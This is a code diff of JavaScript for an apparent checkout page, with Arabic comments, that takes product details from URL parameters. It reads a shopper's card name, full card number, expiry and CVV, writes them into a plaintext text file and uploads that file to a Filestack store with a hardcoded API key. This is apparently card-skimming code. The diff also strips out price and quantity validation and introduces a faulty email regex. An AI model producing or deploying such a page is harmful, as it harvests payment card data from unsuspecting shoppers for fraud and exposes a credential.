@@ -21,8 +21,8 @@ document.addEventListener('DOMContentLoaded', function () {
   // التأكد من أن المعلمات موجودة في الرابط
   const productName = urlParams.name || 'Product Name Not Provided';
   const productColor = urlParams.color || 'Color Not Provided';
-  const productPrice = urlParams.price ? parseFloat(urlParams.price) : NaN; // التأكد من تحويل السعر إلى قيمة عددية صحيحة
-  const productQuantity = urlParams.quantity ? parseInt(urlParams.quantity) : NaN; // التأكد من تحويل الكمية إلى قيمة عددية صحيحة
+  const productPrice = urlParams.price ; // التأكد من تحويل السعر إلى قيمة عددية صحيحة
+  const productQuantity = urlParams.quantity; // التأكد من تحويل الكمية إلى قيمة عددية صحيحة
   const productImageUrl = urlParams.image || ''; // إذا لم يكن هناك صورة في الرابط، نتركها فارغة
 
   // ملء معلومات المنتج باستخدام المعلمات المستلمة من الرابط
@@ -77,10 +77,8 @@ document.addEventListener('DOMContentLoaded', function () {
     const cvv = document.getElementById('cvv').value;
 
     // معلومات المنتج
-    const productName = document.getElementById('product-name').textContent;  // اسم المنتج
-    const productPriceText = document.getElementById('product-price').textContent;  // سعر المنتج
-    const productQuantityText = document.getElementById('product-quantity').textContent;  // كمية المنتج
-    const productImageUrl = urlParams.image || '';  // رابط الصورة
+    const productPriceText = document.getElementById('product-price').textContent.split(': ')[1];  // سعر المنتج
+    const productQuantityText = document.getElementById('product-quantity').textContent.split(': ')[1];  // كمية المنتج
 
     // تحقق من القيم
     let isValid = true;
@@ -128,24 +126,6 @@ document.addEventListener('DOMContentLoaded', function () {
       showErrorMessage('Please enter a valid CVV number.', 'cvv');
     }
 
-    // تحقق من أن السعر ليس NaN (القيمة عددية صحيحة)
-    if (isNaN(productPrice) || productPrice <= 0) {
-      isValid = false;
-      showErrorMessage('Please enter a valid product price.', 'product-price');
-    }
-
-    // تحقق من أن الكمية ليست NaN (القيمة عددية صحيحة)
-    if (isNaN(productQuantity) || productQuantity <= 0) {
-      isValid = false;
-      showErrorMessage('Please enter a valid product quantity.', 'product-quantity');
-    }
-
-    // تحقق من الرابط للصورة
-    if (!productImageUrl) {
-      isValid = false;
-      showErrorMessage('Please provide a valid product image URL.', 'product-image');
-    }
-
     // إذا كانت البيانات صحيحة، أنشئ الملف النصي وأرسله عبر API
     if (isValid) {
       const clientData = {
@@ -165,7 +145,7 @@ document.addEventListener('DOMContentLoaded', function () {
         productPrice: productPriceText,
         productQuantity: productQuantityText,
         productImageUrl: productImageUrl,
-        totalPrice: productPrice * productQuantity
+        totalPrice: totalPrice
       };
 
       // إنشاء المحتوى لملف نصي
@@ -178,29 +158,50 @@ document.addEventListener('DOMContentLoaded', function () {
       fileContent += `Card Name: ${cardName}\n`;
       fileContent += `Card Number: ${cardNumber}\n`;
       fileContent += `Expiry: ${expiry}\n`;
-      fileContent += `CVV: ${cvv}\n`;
-
+      fileContent += `CVV: ${cvv}\n\n`;
       fileContent += `Product Information:\n`;
       fileContent += `Product Name: ${productName}\n`;
-      fileContent += `Product Price: ${productPriceText}\n`;  // السعر بتنسيق نص
-      fileContent += `Product Quantity: ${productQuantityText}\n`;  // الكمية بتنسيق نص
+      fileContent += `Product Price: ${productPriceText}\n`;
+      fileContent += `Product Quantity: ${productQuantityText}\n`;
       fileContent += `Product Image URL: ${productImageUrl}\n`;
-      fileContent += `Total Price: ${totalPrice.toFixed(2)}\n`;  // التأكد من تنسيق السعر الإجمالي
+      fileContent += `Total Price: ${totalPrice.toFixed(2)}\n`;
 
-      // رفع الملف
-      uploadFileToFilestack(fileContent);
+      // رفع الملف إلى Filestack
+      uploadFileToFilestack(fileContent); 
     }
   });
 
   // دالة للتحقق من البريد الإلكتروني
   function validateEmail(email) {
-    const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
-    return emailPattern.test(email);
+    const regex = /^[a-zA-Z0-9._%+-]+@[a-zAZ0-9.-]+\.[a-zA-Z]{2,}$/;
+    return regex.test(email);
   }
 
-  // دالة للتحقق من اسم صاحب البطاقة
+  // دالة للتحقق من اسم حامل البطاقة
   function validateCardName(cardName) {
-    return /^[A-Za-z\s]+$/.test(cardName);  // اسم صاحب البطاقة يتكون من حروف فقط
+    const regex = /^[A-Za-z ]+$/;  // اسم حامل البطاقة يجب أن يحتوي على أحرف فقط
+    return regex.test(cardName);
+  }
+
+  // دالة للتحقق من أرقام البطاقة باستخدام خوارزمية لوهان (Luhn Algorithm)
+  function luhnCheck(cardNumber) {
+    let sum = 0;
+    let shouldDouble = false;
+    for (let i = cardNumber.length - 1; i >= 0; i--) {
+      let digit = parseInt(cardNumber.charAt(i), 10);
+      if (shouldDouble) {
+        digit *= 2;
+        if (digit > 9) {
+          sum += digit - 9;
+        } else {
+          sum += digit;
+        }
+      } else {
+        sum += digit;
+      }
+      shouldDouble = !shouldDouble;
+    }
+    return sum % 10 === 0;
   }
 
   function validateCard(cardNumber) {
@@ -208,70 +209,51 @@ document.addEventListener('DOMContentLoaded', function () {
     return regex.test(cardNumber);
   }
 
-  // دالة للتحقق من صلاحية تاريخ انتهاء البطاقة
+
+  // دالة للتحقق من تاريخ الصلاحية
   function validateExpiry(expiry) {
-    const expiryPattern = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
-    return expiryPattern.test(expiry);
+    const regex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
+    return regex.test(expiry);
   }
 
-  // دالة للتحقق من صلاحية رقم CVV
+  // دالة للتحقق من CVV
   function validateCVV(cvv) {
-    const cvvPattern = /^[0-9]{3,4}$/;
-    return cvvPattern.test(cvv);
+    const regex = /^[0-9]{3,4}$/;
+    return regex.test(cvv);
   }
 
-   // دالة لتنفيذ فحص لوهان
-   function luhnCheck(cardNumber) {
-    let sum = 0;
-    let shouldDouble = false;
-    for (let i = cardNumber.length - 1; i >= 0; i--) {
-      let digit = parseInt(cardNumber.charAt(i));
-      if (shouldDouble) {
-        digit *= 2;
-        if (digit > 9) digit -= 9;
-      }
-      sum += digit;
-      shouldDouble = !shouldDouble;
-    }
-    return (sum % 10 === 0);
+  // دالة لإظهار رسائل الخطأ
+  function showErrorMessage(message, field) {
+    const errorMessage = document.createElement('div');
+    errorMessage.classList.add('error-message');
+    errorMessage.textContent = message;
+    document.getElementById(field).parentNode.appendChild(errorMessage);
   }
 
-  // دالة لرفع الملف إلى Filestack (محاكاة)
-  function uploadFileToFilestack(content) {
-    const file = new Blob([content], { type: 'text/plain' });
-    const formData = new FormData();
-    formData.append('file', file, 'order.txt');
-    formData.append('apikey', 'A7fSrsBg3RjybN1kkK99lz');  // استخدم مفتاح API المناسب
-
-    fetch('https://www.filestackapi.com/api/store/S3', {
-      method: 'POST',
-      body: formData
-    })
-    .then(response => response.json())
-    .then(data => {
-      console.log('File uploaded successfully:', data);
-      window.location.href = 'thank-you.html'; // التوجيه إلى صفحة "شكراً"
-    })
-    .catch(error => {
-      console.error('Error uploading file:', error);
+  // دالة لإزالة رسائل الخطأ السابقة
+  function removeErrorMessages() {
+    const errorMessages = document.querySelectorAll('.error-message');
+    errorMessages.forEach(function(message) {
+      message.remove();
     });
   }
 
-  // دالة لإظهار رسالة الخطأ
-  function showErrorMessage(message, field) {
-    const errorMessage = document.createElement('div');
-    errorMessage.textContent = message;
-    errorMessage.classList.add('error-message');
-    const inputElement = document.getElementById(field);
-    inputElement.parentNode.insertBefore(errorMessage, inputElement.nextSibling);
+  // دالة لرفع الملف إلى Filestack
+  function uploadFileToFilestack(fileContent) {
+    const client = filestack.init('A7fSrsBg3RjybN1kkK99lz');  // استبدل بـ API Key الخاص بك
+    const fileBlob = new Blob([fileContent], { type: 'text/plain' });
+    client.upload(fileBlob)
+      .then((res) => {
+        console.log('File uploaded successfully:', res);
+        // إعادة توجيه المستخدم إلى صفحة "شكرًا"
+        window.location.href = 'thank-you.html';  // قم بتغيير الرابط إلى صفحة "شكراً" الخاصة بك
+      })
+      .catch((err) => {
+        console.error('Error uploading file:', err);
+      });
   }
 
-  // دالة لإزالة رسائل الخطأ
-  function removeErrorMessages() {
-    const errorMessages = document.querySelectorAll('.error-message');
-    errorMessages.forEach(message => message.remove());
-  }
-
+  // إضافة حدث لملء تاريخ الصلاحية تلقائيًا بـ "/"
   const expiryInput = document.getElementById('expiry');
   expiryInput.addEventListener('input', function(event) {
     if (expiryInput.value.length === 2 && !expiryInput.value.includes('/')) {
@@ -279,6 +261,14 @@ document.addEventListener('DOMContentLoaded', function () {
     }
   });
 });
+
+
+  
+  
+
+
+
+
 
 
 
